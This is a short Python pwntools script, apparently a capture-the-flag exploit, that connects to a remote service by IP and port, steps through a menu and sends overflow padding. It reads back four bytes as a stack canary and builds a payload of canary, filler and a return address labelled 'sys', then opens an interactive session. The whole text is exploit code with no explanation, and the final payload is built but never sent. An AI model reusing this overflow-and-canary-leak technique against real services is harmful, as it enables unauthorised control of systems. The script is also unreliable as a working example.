from  pwn import *
context(os="linux",arch="i386",log_level="debug")
p=remote("111.200.241.244","55173")
pay=b"a"*(0x70+4)
p.recvuntil(":\n")
p.sendline("1")

p.recvuntil("s\n")
p.sendline("120")

p.recvuntil("t\n")
p.sendline("3")

p.recvuntil(":\n")
p.sendline("2566666")

p.recvuntil(":\n")
p.send(pay)

#canary=u32(p.recv(numb=4)-ord("\n"))
canary=p.recv(4)
print(canary)

sys=0x0804859B 
pay+=p32(canary)+b'a'*8+b"a"*4+p32(sys)

p.interactive()
